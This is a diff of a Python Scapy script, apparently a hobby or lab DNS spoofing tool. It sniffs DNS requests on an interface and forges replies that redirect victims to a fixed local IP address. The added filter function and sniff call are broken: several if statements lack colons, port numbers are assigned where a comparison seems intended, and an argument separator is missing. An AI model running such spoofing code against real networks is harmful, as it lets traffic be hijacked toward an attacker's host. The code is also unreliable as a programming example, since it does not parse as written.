@@ -21,8 +21,25 @@ from scapy.all import *
 ## DEFINING CONSTANT
 redirectedIP = "192.168.1.30" # my fedora host ip
 
-## DEFINING CALLBACK FUNCTION
+## DEFINING CALLBACK FUNCTIONS
+	# EACH PACKET WILL GO THROUGH THE FILTER TEST, TRUE FOR MATCH, FALSE FOR UNMATCH
 
+def filterbuilder (pkt) :
+	if pkt.haslayer(DNSQR)
+		if pkt.haslayer(UDP)
+			pkt[UDP].dport = 53
+			print "FOUND A DNS REQUEST ON UDP PORT 53"
+			return True
+		elif pkt.haslayer(TCP)
+			pkt[TCP].dport = 53
+			print "FOUND A DNS REQUEST ON TCP PORT 53"
+			return True
+		else:	
+			print "ERROR OCCURED IN FILTER BUILDER, DNSQR PACKET DOESNT HAVE A CORRECT TRANSPORT PROTOCOL "	
+			return False
+
+	
+	# EACH PACKET THAT PASSES THE FILTER WILL GO THROUGH THIS ONE FOR DNS SPOOFING
 def dnsSpoof (pkt):
 	if pkt.haslayer(DNSQR): # DNS question record.. aka dns request packet
 				# this is where the spoofing takes place changing the src and dst of each header, ip/udp
@@ -44,6 +61,6 @@ def dnsSpoof (pkt):
 # remember dns is an application layer that uses udp (mainly) 
 # on port 53, hece the sniff filter at port 53, as the second arg
 # first arg is the interface we want to sniff from
-sniff(iface="eth0", filter="udp and port 53", store=0, prn=dnsSpoof)
+sniff(iface="eth0", lfilter=filterbuilder filter="udp", store=0, prn=dnsSpoof)
 
 
